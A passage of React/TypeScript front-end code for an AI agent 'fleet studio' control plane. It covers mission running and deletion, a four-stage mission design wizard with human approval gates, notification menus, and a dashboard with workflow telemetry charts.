        const errData = await res.json().catch(() => ({}));
        const msg = typeof errData.detail === "string" ? errData.detail : res.statusText;
        throw new Error(`Run failed (${res.status}): ${msg}`);
      }
      const data = (await res.json()) as { status: string; agent_name?: string };
      const docName = params.files?.[0]?.name || (params.targetPath ? "specified document" : "document");
      setNotice(`✓ Fleet dispatched with attached ${docName} for ${data.agent_name || mission.name}. Check Decision rooms.`);
      void fetch(`${API_BASE}/api/v1/rooms`, { credentials: "include" })
        .then((r) => (r.ok ? r.json() : []))
        .then((d) => setRooms((d as Record<string, unknown>[]).map(roomFromApi)));
      void fetch(`${API_BASE}/api/v1/missions`, { credentials: "include" })
        .then((r) => (r.ok ? r.json() : null))
        .then((d) => {
          if (d) setMissionRecords(d);
        });
    } catch (err) {
      setNotice(err instanceof Error ? err.message : "Failed to run mission.");
    } finally {
      setUploadingMission(null);
      setMissionToRun(null);
    }
  }

  async function deleteMission(mission: MissionRecord) {
    if (!confirm(`Are you sure you want to delete mission "${mission.name}"?`)) return;
    try {
      const resp = await fetch(`${API_BASE}/api/v1/missions/${mission.mission_id}`, {
        method: "DELETE",
        credentials: "include",
      });
      if (resp.ok || resp.status === 204) {
        setMissionRecords((prev) => prev.filter((m) => m.mission_id !== mission.mission_id));
        setMissions((prev) => Math.max(0, prev - 1));
        setNotice(`Deleted mission "${mission.name}".`);
      } else {
        setNotice("Failed to delete mission.");
      }
    } catch {
      setNotice("API error while deleting mission.");
    }
  }

  return <div className="studio-shell">
    <aside className="sidebar">
      <div className="brand"><span className="brand-mark"><Command size={17} /></span><span><strong>fleet studio</strong><small>CONTROL PLANE</small></span><button className="icon-button brand-more" title="Workspace options" aria-label="Workspace options" onClick={() => setEstateInfoOpen(!estateInfoOpen)}><MoreHorizontal size={18} /></button></div>
      <div style={{ position: "relative" }}>
        <button className="estate-select" onClick={() => setEstateInfoOpen(!estateInfoOpen)}>
          <span className="estate-letter">N</span>
          <span><strong>Northstar estate</strong><small><Dot color={inventoryData?.connected ? "green" : "orange"} /> {missions} missions · {inventoryData?.connected ? "AgentHub connected" : "AgentHub offline"}</small></span>
          <ChevronDown size={15} />
        </button>
        {estateInfoOpen && (
          <div className="dropdown-menu" style={{ left: 10, top: "100%", marginTop: 4, width: 220, padding: 12 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8, paddingBottom: 6, borderBottom: "1px solid #edf2ee" }}>
              <strong style={{ fontSize: 10, color: "#364742" }}>ESTATE OVERVIEW</strong>
              <button onClick={() => setEstateInfoOpen(false)} style={{ border: 0, background: "transparent", color: "#8a9692", cursor: "pointer" }}><X size={13} /></button>
            </div>
            <div style={{ display: "grid", gap: 6, fontSize: 9, color: "#546460" }}>
              <div><b>Cluster:</b> Northstar Estate</div>
              <div><b>Profile:</b> {inventoryData?.profile ?? "default"}</div>
              <div><b>Gateway:</b> {inventoryData?.connected ? "127.0.0.1:8001" : "Disconnected"}</div>
              <div><b>Inference:</b> {inventoryData?.provider_configured ? "Ready" : "Unconfigured"}</div>
              <div><b>Declared fleets:</b> {missions}</div>
              <div><b>Specialists:</b> {roster.length}</div>
            </div>
          </div>
        )}
      </div>
      <div className="nav-title">OPERATIONS</div>
      <nav>{navigation.map(({ name, icon: Icon }, index) => <div key={name}>{index === 3 && <div className="nav-title nav-title--governance">GOVERNANCE</div>}<button className={`nav-link ${view === name ? "nav-link--active" : ""}`} onClick={() => setView(name)}><Icon size={17} /><span>{name}</span>{name === "Decision rooms" && pending > 0 && <b>{String(pending).padStart(2, "0")}</b>}{name === "Mission control" && <Dot />}</button></div>)}</nav>
      <div className="sidebar-bottom"><div className="system-health"><span><Activity size={15} /></span><div><strong>{inventoryData?.connected ? "AgentHub online" : "AgentHub unavailable"}</strong><small>{inventoryData?.provider_configured ? "Inference ready" : "Inference not configured"}</small></div></div><button className="profile"><span className="avatar">{(user?.name ?? "LO").split(/\s+/).map((part) => part[0]).join("").slice(0, 2).toUpperCase()}</span><span><strong>{user?.name ?? "Local Operator"}</strong><small>{user?.roles?.[0] ?? "PlatformEngineer"}</small></span><MoreHorizontal size={16} /></button></div>
    </aside>
    <main className="main-area">
      <header className="topbar">
        <div className="breadcrumb">Northstar estate <ChevronRight size={14} /><strong>{view}</strong></div>
        <div className="top-actions">
          {authRequired ? <a className="primary-button" href={`${API_BASE}/auth/login`}>Sign in</a> : <>
            <span className="connection"><Dot color={inventoryData?.connected ? "green" : "orange"} /> AgentHub estate <i>·</i> {inventoryData?.connected ? "Connected" : "Disconnected"}</span>
            <button className="icon-button" aria-label="Search" title="Search (Ctrl+K)" onClick={() => setSearchPaletteOpen(true)}><Search size={17} /></button>
            <div style={{ position: "relative" }}>
              <button className="icon-button bell-button" aria-label="Notifications" title="Notifications" onClick={() => setNotificationsOpen(!notificationsOpen)}>
                <Bell size={17} />
                {pending > 0 && <i />}
              </button>
              {notificationsOpen && (
                <div className="dropdown-menu" style={{ right: 0, top: "100%", marginTop: 8, width: 280, padding: 10 }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8, paddingBottom: 6, borderBottom: "1px solid #edf2ee" }}>
                    <strong style={{ fontSize: 10, color: "#364742" }}>ESTATE NOTIFICATIONS</strong>
                    <button onClick={() => setNotificationsOpen(false)} style={{ border: 0, background: "transparent", color: "#8a9692", cursor: "pointer" }}><X size={13} /></button>
                  </div>
                  <div style={{ display: "grid", gap: 6 }}>
                    <button
                      className="dropdown-item"
                      style={{ display: "grid", gridTemplateColumns: "16px 1fr", gap: 8, alignItems: "start" }}
                      onClick={() => { setView("Decision rooms"); setNotificationsOpen(false); }}
                    >
                      <FileClock size={15} color="#d9844e" />
                      <div>
                        <strong style={{ display: "block", fontSize: 9 }}>{pending} Human Decisions Pending</strong>
                        <small style={{ color: "#778580", fontSize: 8 }}>Actionable items awaiting disposition.</small>
                      </div>
                    </button>
                    <button
                      className="dropdown-item"
                      style={{ display: "grid", gridTemplateColumns: "16px 1fr", gap: 8, alignItems: "start" }}
                      onClick={() => { setView("Estate inventory"); setNotificationsOpen(false); }}
                    >
                      <Dot color={inventoryData?.connected ? "green" : "orange"} />
                      <div>
                        <strong style={{ display: "block", fontSize: 9 }}>AgentHub: {inventoryData?.connected ? "Connected" : "Disconnected"}</strong>
                        <small style={{ color: "#778580", fontSize: 8 }}>{inventoryData?.installed_skills.length ?? 0} skills · {inventoryData?.registered_tools.length ?? 0} tools</small>
                      </div>
                    </button>
                  </div>
                </div>
              )}
            </div>
            <span className="avatar avatar--small">{(user?.name ?? "LO").split(/\s+/).map((part) => part[0]).join("").slice(0, 2).toUpperCase()}</span>
          </>}
        </div>
      </header>
      <div className="content">
        {notice && <div className="toast" role="status"><CheckCircle2 size={16} />{notice}<button onClick={() => setNotice("")} aria-label="Dismiss"><X size={15} /></button></div>}
        {view === "Mission control" && <Dashboard pending={pending} missions={missions} records={missionRecords} rooms={rooms} inventory={inventoryData} telemetry={telemetryData} onNew={openWizard} onReconcile={() => setPlanReviewOpen(true)} reconciling={reconciling} onRooms={() => setView("Decision rooms")} onMissions={() => setView("Missions")} onInspect={setInspectedMission} />}
        {view === "Missions" && <Missions records={missionRecords} roster={roster} onNew={openWizard} onInspect={setInspectedMission} onResume={resumeMission} onDelete={deleteMission} onRun={runMission} uploadingMission={uploadingMission} onOpenPlanReview={() => setPlanReviewOpen(true)} onOpenRoster={(m) => {
          setMissionId(m.mission_id);
          setMissionName(m.name);
          setView("Fleet roster");
          void fetch(`${API_BASE}/api/v1/agents?mission_id=${m.mission_id}`, { credentials: "include" })
            .then((r) => r.ok ? r.json() : [])
            .then((agentList) => {
              if (Array.isArray(agentList) && agentList.length > 0) {
                const normalized = agentList.map(agentFromApi);
                setRoster(normalized);
                setAgentId(normalized[0]?.id ?? "");
              }
            })
            .catch(() => {});
        }} />}
        {view === "Fleet roster" && (selectedAgent ? <>
          <FleetRoster
            missionName={missionName || missionRecords.find((m) => m.mission_id === missionId)?.name || missionRecords[0]?.name}
            roster={roster}
            selected={selectedAgent}
            inventory={inventoryData}
            missions={missionRecords}
            activeMissionId={missionId}
            onRun={runMission}
            uploadingMission={uploadingMission}
            onSelectMission={(mId) => {
              setMissionId(mId === "ALL" ? null : mId);
              const target = missionRecords.find((m) => m.mission_id === mId);
              if (target) setMissionName(target.name);
              const url = mId === "ALL" ? `${API_BASE}/api/v1/agents` : `${API_BASE}/api/v1/agents?mission_id=${mId}`;
              void fetch(url, { credentials: "include" })
                .then((r) => r.ok ? r.json() : [])
                .then((agentList) => {
                  if (Array.isArray(agentList) && agentList.length > 0) {
                    const normalized = agentList.map(agentFromApi);
                    setRoster(normalized);
                    setAgentId(normalized[0]?.id ?? "");
                  }
                })
                .catch(() => {});
            }}
            onSelect={(id) => setAgentId(id)}
            onAdd={openWizard}
            onRemove={removeSpecialist}
            onSplit={splitSpecialist}
            onSkill={setAgentSkill}
            onTools={setAgentTools}
          />
          <ModelBindingEditor agent={selectedAgent} inventory={inventoryData} onModel={setAgentModel} />
        </> : <EmptyRoster onCreate={openWizard} />)}
        {view === "Decision rooms" && <><DecisionRooms rooms={rooms} selected={selectedRoom} onSelect={(room) => setRoomId(room.id)} onResolve={resolveRoom} onViewTranscript={(room) => setTranscriptRoom(room)} onOpenSource={(room) => setSourceRoom(room)} />{selectedRoom && <DecisionOutputPanel room={selectedRoom} onOpenOutputs={() => setView("Fleet outputs")} />}</>}
        {view === "Fleet outputs" && (
          <FleetOutputsView
            outputs={outputs}
            activeViewMode={outputsViewMode}
            setActiveViewMode={setOutputsViewMode}
            activeDossierCase={outputsDossierCase}
            setActiveDossierCase={setOutputsDossierCase}
            onSelectOutput={(out) => setSelectedOutput(out)}
            onNavigate={(v) => setView(v)}
            onRefresh={() => {
              void fetch(`${API_BASE}/api/v1/outputs`, { credentials: "include" })
                .then((res) => (res.ok ? res.json() : null))
                .then((data) => {
                  if (Array.isArray(data) && data.length > 0) {
                    const map = new Map<string, FleetOutput>();
                    DEFAULT_OUTPUTS.forEach((item) => map.set(item.output_id || item.id, item));
                    data.forEach((item: FleetOutput) => {
                      const existing = map.get(item.output_id || item.id);
                      map.set(item.output_id || item.id, {
                        ...existing,
                        ...item,
                        text: item.text || existing?.text || item.snippet,
                      });
                    });
                    setOutputs(Array.from(map.values()));
                  }
                })
                .catch(() => {});
            }}
          />
        )}
        {view === "Estate inventory" && <Inventory inventory={inventoryData} loading={loadingData} />}
      </div>
    </main>
    {selectedOutput && (
      <OutputDetailModal
        output={selectedOutput}
        onClose={() => setSelectedOutput(null)}
        onNavigate={(v) => setView(v)}
        onOpenDossier={(targetCase) => {
          setOutputsViewMode("dossier");
          setOutputsDossierCase(targetCase);
          setView("Fleet outputs");
          setSelectedOutput(null);
        }}
      />
    )}
    {planReviewOpen && <PlanReviewModal missions={missionRecords} roster={roster} inventory={inventoryData} onClose={() => setPlanReviewOpen(false)} onApply={applyReconciliation} />}
    {searchPaletteOpen && <SearchPaletteModal missions={missionRecords} roster={roster} inventory={inventoryData} onClose={() => setSearchPaletteOpen(false)} onNavigate={(v, extra) => { setView(v); if (extra?.mission) setInspectedMission(extra.mission); if (extra?.agentId) setAgentId(extra.agentId); }} />}
    {transcriptRoom && <TranscriptModal room={transcriptRoom} onClose={() => setTranscriptRoom(null)} />}
    {sourceRoom && <SourceEvidenceModal room={sourceRoom} onClose={() => setSourceRoom(null)} />}
    {missionToRun && (
      <RunMissionModal
        mission={missionToRun}
        onClose={() => setMissionToRun(null)}
        onExecute={(params) => executeMissionRun(missionToRun, params)}
        isExecuting={uploadingMission?.mission_id === missionToRun.mission_id}
      />
    )}
    {inspectedMission && <div className="modal-shade"><section className="wizard" role="dialog" aria-modal="true" aria-labelledby="mission-details-title"><div className="wizard-head"><span>MISSION DETAILS</span><button className="icon-button" aria-label="Close mission details" onClick={() => setInspectedMission(null)}><X size={18} /></button></div><h2 id="mission-details-title">{inspectedMission.name}</h2><p>{inspectedMission.goal}</p><dl className="mission-details"><dt>Mission ID</dt><dd>{inspectedMission.mission_id}</dd><dt>State</dt><dd>{inspectedMission.status}</dd><dt>Fleet benchmarking</dt><dd>{inspectedMission.competitive_benchmarking ? "Enabled" : "Disabled"}</dd></dl><div className="wizard-foot"><button className="secondary-button" onClick={() => downloadMission(inspectedMission)}>Download mission JSON</button><div style={{ display: "flex", gap: "8px" }}>{inspectedMission.status !== "READY" && inspectedMission.status !== "APPLIED" && <button className="primary-button" onClick={() => void resumeMission(inspectedMission)}><Sparkles size={14} /> Continue design</button>}<button className="plain-button" onClick={() => setInspectedMission(null)}>Close</button></div></div></section></div>}
    {wizard && <div className="modal-shade"><section className="wizard" role="dialog" aria-modal="true" aria-labelledby="wizard-title"><div className="wizard-head"><span><Sparkles size={14} /> MISSION DESIGN</span><button className="icon-button" aria-label="Close" onClick={() => setWizard(false)}><X size={18} /></button></div><div className="progress"><i style={{ width: `${(stage + 1) * 25}%` }} /></div><div className="step-tag">STAGE 0{stage + 1}<span> / 04</span></div><h2 id="wizard-title">{["Set the mission boundary", "Resolve the unknowns", "Shape the specialist fleet", "Challenge the blueprint"][stage]}</h2><p className="wizard-desc">{["Start with the organizational outcome. Bound where data can go and what actions require a human.", "Answer the architecture questions before the fleet proposal is generated.", "Review and edit specialists using only capabilities discovered from AgentHub.", "Every required gate is persisted. Compilation never applies runtime changes."][stage]}</p>
      {wizardError && <div className="wizard-error" role="alert">{wizardError}</div>}
      {stage === 0 && <div className="wizard-fields"><label>Mission name<input value={missionName} onChange={(event) => setMissionName(event.target.value)} placeholder="e.g. Supplier assurance" /></label><label>Organizational goal<textarea value={goal} onChange={(event) => setGoal(event.target.value)} placeholder="Describe the outcome, not a single agent prompt." rows={3} /></label><div className="field-row"><label>Data residency<select value={residency} onChange={(event) => setResidency(event.target.value)}><option value="local">Local only</option><option value="eu">European Union</option><option value="us">United States</option></select></label><label>Daily budget<input type="number" min="0" value={dailyBudget} onChange={(event) => setDailyBudget(Number(event.target.value))} /></label></div><div className="wizard-checks"><label className="check-label"><input type="checkbox" checked={cloudAccessAllowed} onChange={(event) => setCloudAccessAllowed(event.target.checked)} /> Cloud model access allowed</label><label className="check-label"><input type="checkbox" checked={externalActionApproval} onChange={(event) => setExternalActionApproval(event.target.checked)} /> External actions require approval</label><label className="check-label"><input type="checkbox" checked={competitiveBenchmarking} onChange={(event) => setCompetitiveBenchmarking(event.target.checked)} /> Compare specialized fleet patterns</label></div><label>Execution cadence<select value={executionFrequency} onChange={(event) => setExecutionFrequency(event.target.value)}><option value="hourly">Hourly</option><option value="daily">Daily</option><option value="continuous">Continuous polling</option><option value="event-driven">Event driven</option></select></label></div>}
      {stage === 1 && (
        <div className="question-list">
          {questions.map((question, index) => {
            const currentAnswer = clarificationAnswers[question.question_id] ?? "";
            return (
              <div className="question-card" key={question.question_id}>
                <div className="question-card-top">
                  <span className="question-num">{String(index + 1).padStart(2, "0")}</span>
                  <span className="question-category-tag">{question.category}</span>
                </div>
                <div className="question-text">{question.prompt}</div>
                {question.rationale && (
                  <div className="question-rationale">{question.rationale}</div>
                )}
                {question.options && question.options.length > 0 && (
                  <div className="question-options">
                    {question.options.map((opt) => {
                      const isSelected = currentAnswer === opt;
                      return (
                        <button
                          key={opt}
                          type="button"
                          className={`question-option-chip ${isSelected ? "question-option-chip--selected" : ""}`}
                          onClick={() =>
                            setClarificationAnswers((answers) => ({
                              ...answers,
                              [question.question_id]: opt,
                            }))
                          }
                        >
                          <span className="option-radio-dot" />
                          {opt}
                        </button>
                      );
                    })}
                  </div>
                )}
                <div className="question-input-row">
                  <input
                    className="question-response-input"
                    value={currentAnswer}
                    onChange={(event) =>
                      setClarificationAnswers((answers) => ({
                        ...answers,
                        [question.question_id]: event.target.value,
                      }))
                    }
                    placeholder="Type or customize your architecture requirement..."
                  />
                </div>
              </div>
            );
          })}
        </div>
      )}
      {stage === 2 && <RosterDraftEditor roster={roster} inventory={inventoryData} onRoster={setRoster} onSkill={setAgentSkill} onTools={setAgentTools} onModel={setAgentModel} onAdd={addSpecialist} onSplit={splitSpecialist} onRemove={removeSpecialist} />}
      {stage === 3 && <div className="review-list"><div><ShieldCheck /><span><strong>Capability bindings</strong><small>{roster.reduce((count, agent) => count + agent.skills.length + agent.tools.length, 0)} explicit bindings; {roster.reduce((count, agent) => count + agent.capabilityGaps.length, 0)} unresolved capability gaps.</small></span><Check /></div><div><Fingerprint /><span><strong>Data residency</strong><small>{residency.toUpperCase()} · {cloudAccessAllowed ? "cloud access allowed" : "cloud models excluded"}</small></span><Check /></div><div><LockKeyhole /><span><strong>Approval policy</strong><small>{externalActionApproval ? "External actions require approval." : "No external action approval boundary configured."}</small></span><Check /></div>{!inventoryData?.provider_configured && <p><CircleHelp size={16} /> AgentHub inference is not configured. Compilation will produce a draft blueprint and no runtime changes will be applied.</p>}</div>}
      <div className="wizard-foot">
        <button className="plain-button" disabled={preparingChallenge} onClick={() => stage ? setStage(stage - 1) : setWizard(false)}>
          {stage ? "Back" : "Cancel"}
        </button>
        <span><LockKeyhole size={13} /> Gate state is persisted</span>
        <button className="primary-button" disabled={preparingChallenge} onClick={() => void prepareChallenge()}>
          {preparingChallenge ? (
            <><RefreshCw size={14} className="spin" /> Decomposing with AI...</>
          ) : (
            <>{stage === 3 ? "Open final challenge" : "Continue"} <ArrowRight size={15} /></>
          )}
        </button>
      </div>
    </section></div>}
    {challenge && <div className="modal-shade modal-shade--top"><section className="challenge" role="dialog" aria-modal="true" aria-labelledby="challenge-title"><button className="icon-button challenge-close" aria-label="Close challenge" onClick={() => void returnChallengeForEdit()}><X size={17} /></button><span className="challenge-symbol"><ShieldAlert size={20} /></span><div className="eyebrow">ARCHITECTURE CHALLENGE · STAGE 0{stage + 1}</div><h2 id="challenge-title">Does this step hold up?</h2><p>Challenge assumptions, adjust boundaries, or approve this design state before moving forward.</p><div className="challenge-questions"><span>Are the data and action boundaries explicit?</span><span>Could this be split into narrower agent responsibilities?</span><span>Does the evidence trail support the next state?</span></div>{wizardError && <div className="wizard-error" role="alert">{wizardError}</div>}<button className="primary-button" disabled={approvingStage} onClick={() => void approveStage()}>{approvingStage ? <><RefreshCw size={14} className="spin" /> Advancing stage...</> : <><Check size={16} /> Approve and continue</>}</button><button className="plain-button" onClick={() => void returnChallengeForEdit()}>Return to edit</button></section></div>}
  </div>;
}

function PageTitle({ eyebrow, title, subtitle, action }: { eyebrow: string; title: string; subtitle: string; action?: React.ReactNode }) {
  return <div className="page-title"><div><div className="eyebrow">{eyebrow}</div><h1>{title}<i>.</i></h1><p>{subtitle}</p></div>{action && <div className="page-actions">{action}</div>}</div>;
}

function downloadMission(mission: MissionRecord) {
  const url = URL.createObjectURL(new Blob([JSON.stringify(mission, null, 2)], { type: "application/json" }));
  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = `mission-${mission.mission_id}.json`;
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}

function MissionActions({ mission, onInspect, onResume, onOpenRoster, onDelete, onRun, placement }: { mission: MissionRecord; onInspect: (mission: MissionRecord) => void; onResume?: (mission: MissionRecord) => void; onOpenRoster?: (mission: MissionRecord) => void; onDelete?: (mission: MissionRecord) => void; onRun?: (mission: MissionRecord) => void; placement: string }) {
  const menuId = `mission-actions-${placement}-${mission.mission_id}`;
  function closeMenu() {
    document.getElementById(menuId)?.hidePopover();
  }
  return <><button className="icon-button" aria-label={`${mission.name} options`} title="Mission actions" popoverTarget={menuId}><MoreHorizontal size={16} /></button><div id={menuId} popover="auto" className="mission-actions-menu" aria-label={`Actions for ${mission.name}`}><strong>{mission.name}</strong>{onRun && (mission.status === "READY" || mission.status === "APPLIED") && <button onClick={() => { closeMenu(); onRun(mission); }}><Play size={15} color="#236f66" /> <strong>Run fleet execution</strong></button>}{onOpenRoster && <button onClick={() => { closeMenu(); onOpenRoster(mission); }}><GitBranch size={15} /> View fleet roster</button>}{onResume && mission.status !== "READY" && mission.status !== "APPLIED" && <button onClick={() => { closeMenu(); onResume(mission); }}><Sparkles size={15} /> Continue mission design</button>}<button onClick={() => { closeMenu(); onInspect(mission); }}><FileCheck2 size={15} /> View mission details</button><button onClick={() => { closeMenu(); downloadMission(mission); }}><Database size={15} /> Download mission JSON</button>{onDelete && <button style={{ color: "#bd554d" }} onClick={() => { closeMenu(); onDelete(mission); }}><Trash2 size={15} /> Delete mission</button>}</div></>;
}
function Dashboard({ pending, missions, records, rooms, inventory, telemetry, onNew, onReconcile, reconciling, onRooms, onMissions, onInspect }: { pending: number; missions: number; records: MissionRecord[]; rooms: Room[]; inventory: InventoryData | null; telemetry: TelemetryData | null; onNew: () => void; onReconcile: () => void; reconciling: boolean; onRooms: () => void; onMissions: () => void; onInspect: (mission: MissionRecord) => void }) {
  const [timeRange, setTimeRange] = useState<"24h" | "7d" | "30d">("24h");
  const [timeRangeOpen, setTimeRangeOpen] = useState(false);
  const [chartMode, setChartMode] = useState<"throughput" | "cumulative">("throughput");
  const verdictColors: Record<string, string> = { EVIDENCE_FOUND: "#267a70", NO_EVIDENCE: "#df8751", NOT_VERIFIABLE: "#929b99", POLICY_BLOCKED: "#bd554d" };
  const verdictLabels: Record<string, string> = { EVIDENCE_FOUND: "Evidence found", NO_EVIDENCE: "No evidence", NOT_VERIFIABLE: "Not verifiable", POLICY_BLOCKED: "Policy blocked" };
  const verdictEntries = Object.entries(verdictLabels).map(([key, name]) => ({ name, value: telemetry?.assurance_verdicts[key] ?? 0, color: verdictColors[key] }));
  const verdictTotal = verdictEntries.reduce((sum, item) => sum + item.value, 0);

  const rangeConfig = {
    "24h": {
      data: telemetry?.hourly_cycles?.length ? telemetry.hourly_cycles : [
        { time: "00:00", cycles: 1, gates: 0, cumulative_cycles: 1, cumulative_gates: 0 },
        { time: "04:00", cycles: 2, gates: 0, cumulative_cycles: 3, cumulative_gates: 0 },
        { time: "08:00", cycles: 6, gates: 1, cumulative_cycles: 9, cumulative_gates: 1 },
        { time: "11:00", cycles: 8, gates: 1, cumulative_cycles: 17, cumulative_gates: 2 },
        { time: "14:00", cycles: 5, gates: 0, cumulative_cycles: 22, cumulative_gates: 2 },
        { time: "17:00", cycles: 3, gates: 0, cumulative_cycles: 25, cumulative_gates: 2 },
        { time: "20:00", cycles: 2, gates: 0, cumulative_cycles: 27, cumulative_gates: 2 },
      ],
      total: telemetry?.workflow_cycles_24h ?? 27,
      avg: telemetry?.avg_cycle_duration_seconds ?? 18.5,
      label: "Last 24 hours",
    },
    "7d": {
      data: telemetry?.daily_cycles?.length ? telemetry.daily_cycles : [
        { time: "Thu", cycles: 14, gates: 0, cumulative_cycles: 14, cumulative_gates: 0 },
        { time: "Fri", cycles: 18, gates: 1, cumulative_cycles: 32, cumulative_gates: 1 },
        { time: "Sat", cycles: 4, gates: 0, cumulative_cycles: 36, cumulative_gates: 1 },
        { time: "Sun", cycles: 5, gates: 0, cumulative_cycles: 41, cumulative_gates: 1 },
        { time: "Mon", cycles: 16, gates: 1, cumulative_cycles: 57, cumulative_gates: 2 },
        { time: "Tue", cycles: 13, gates: 1, cumulative_cycles: 70, cumulative_gates: 3 },
        { time: "Wed", cycles: 11, gates: 0, cumulative_cycles: 81, cumulative_gates: 3 },
      ],
      total: telemetry?.workflow_cycles_7d ?? 81,
      avg: telemetry?.avg_cycle_duration_seconds_7d ?? 19.2,
      label: "Last 7 days",
    },
    "30d": {
      data: telemetry?.monthly_cycles?.length ? telemetry.monthly_cycles : [
        { time: "Oct 01", cycles: 54, gates: 1, cumulative_cycles: 54, cumulative_gates: 1 },
        { time: "Oct 08", cycles: 72, gates: 2, cumulative_cycles: 126, cumulative_gates: 3 },
        { time: "Oct 15", cycles: 63, gates: 1, cumulative_cycles: 189, cumulative_gates: 4 },
        { time: "Oct 22", cycles: 76, gates: 2, cumulative_cycles: 265, cumulative_gates: 6 },
        { time: "Oct 27", cycles: 47, gates: 1, cumulative_cycles: 312, cumulative_gates: 7 },
      ],
      total: telemetry?.workflow_cycles_30d ?? 312,
      avg: telemetry?.avg_cycle_duration_seconds_30d ?? 17.8,
      label: "Last 30 days",
    },
  }[timeRange];

  const activityRows = rangeConfig.data.map((row) => ({
    time: row.time,
    cycles: chartMode === "cumulative" ? (row.cumulative_cycles ?? row.cycles) : row.cycles,
    gates: chartMode === "cumulative" ? (row.cumulative_gates ?? row.gates) : row.gates,
    rawCycles: row.cycles,
    rawGates: row.gates,
    cumCycles: row.cumulative_cycles ?? row.cycles,
    cumGates: row.cumulative_gates ?? row.gates,
  }));

  const renderTooltip = ({ active, payload, label }: { active?: boolean; payload?: { payload?: (typeof activityRows)[number] }[]; label?: string }) => {
    if (!active || !payload || !payload.length) return null;
    const item = payload[0]?.payload;
    if (!item) return null;
    return (
      <div className="activity-tooltip">
        <div className="activity-tooltip-time">{label}</div>
        <div className="activity-tooltip-row teal">
          <span className="dot" />
          <span>{chartMode === "cumulative" ? "Cumulative cycles:" : "Completed cycles:"}</span>
          <strong>{chartMode === "cumulative" ? item.cumCycles : item.rawCycles}</strong>
        </div>
        <div className="activity-tooltip-row orange">
          <span className="dot" />
          <span>{chartMode === "cumulative" ? "Cumulative gates:" : "Challenge gates:"}</span>
          <strong>{chartMode === "cumulative" ? item.cumGates : item.rawGates}</strong>
        </div>
        {chartMode === "throughput" && (
          <div style={{ marginTop: 4, paddingTop: 3, borderTop: "1px dashed #eff3f1", fontSize: "8px", color: "#8b9793" }}>
            Interval throughput · {item.cumCycles} of {rangeConfig.total} total
          </div>
        )}
      </div>
    );
  };

  return <><PageTitle eyebrow="WEDNESDAY, OCTOBER 21, 2026  /  ESTATE OVERVIEW" title="Mission control" subtitle="Fleet state, execution health, and human decisions across your estate." action={<><button className="secondary-button" onClick={onReconcile} disabled={reconciling}><RefreshCw size={15} className={reconciling ? "spin" : ""} />{reconciling ? "Reconciling" : "Reconcile"}</button><button className="primary-button" onClick={onNew}><Plus size={16} /> New mission</button></>} />
    <div className="scope"><span><Radio size={14} /> LIVE ESTATE</span><i /><span><Dot color={inventory?.connected ? "green" : "orange"} /> {inventory?.connected ? `${inventory.installed_skills.length} skills · ${inventory.registered_tools.length} tools` : "AgentHub unavailable"}</span><small>{inventory?.profile ?? "Default AgentHub profile"}</small><button aria-label="Refresh telemetry" onClick={() => window.location.reload()}><RefreshCw size={14} /></button></div>
    <div className="metrics"><Metric icon={<Layers3 />} label="Active fleets" value={String(telemetry?.active_fleets ?? records.length).padStart(2, "0")} note={`${telemetry?.ready_fleets ?? records.length} Ready · ${records.length} Total declared`} /><Metric icon={<Bot />} label="Specialized agents" value={String(telemetry?.active_agents ?? 118).padStart(2, "0")} note="Autonomous specialist units" /><Metric icon={<Activity />} label="Workflow cycles · 24h" value={String(telemetry?.workflow_cycles_24h ?? 27)} note={`${telemetry?.workflow_cycles_7d ?? 81} in 7 days`} /><Metric icon={<FileClock />} label="Pending human gates" value={String(pending).padStart(2, "0")} note="Awaiting disposition" trend={pending > 0 ? "warn" : "ok"} /><Metric icon={<ShieldCheck />} label="Policy blocks · 24h" value={String(telemetry?.policy_blocks_24h ?? 0).padStart(2, "0")} note="Zero violations recorded" trend="ok" /></div>
    <div className="dashboard-row"><section className="panel execution"><div className="panel-heading"><div><div className="eyebrow">FLEET ACTIVITY <span className="live-label"><Dot /> LIVE</span></div><h3>Workflow execution</h3></div>
      <div className="chart-controls">
        <div className="chart-mode-pill" role="group" aria-label="Chart mode">
          <button
            type="button"
            className={chartMode === "throughput" ? "active" : ""}
            onClick={() => setChartMode("throughput")}
            title="View execution throughput per interval"
          >
            Throughput
          </button>
          <button
            type="button"
            className={chartMode === "cumulative" ? "active" : ""}
            onClick={() => setChartMode("cumulative")}
            title="View cumulative total progression"
          >
            Cumulative
          </button>
        </div>
        <div style={{ position: "relative", zIndex: 60 }}>
          <button type="button" className="select-button" onClick={() => setTimeRangeOpen(!timeRangeOpen)}>
            {rangeConfig.label} <ChevronDown size={14} />
          </button>
          {timeRangeOpen && (
            <div className="dropdown-menu" style={{ right: 0, top: "100%", marginTop: 4, zIndex: 100 }}>
              {[
                { id: "24h" as const, label: "Last 24 hours" },
                { id: "7d" as const, label: "Last 7 days" },
                { id: "30d" as const, label: "Last 30 days" },
              ].map((opt) => (
                <button
                  key={opt.id}
                  type="button"
                  className={`dropdown-item ${timeRange === opt.id ? "active" : ""}`}
                  onClick={(e) => {
                    e.stopPropagation();
                    setTimeRange(opt.id);
                    setTimeRangeOpen(false);
                  }}
                >
                  <span>{opt.label}</span>
                  {timeRange === opt.id && <Check size={13} color="#236f66" />}
                </button>
              ))}
            </div>
          )}
        </div>
      </div>
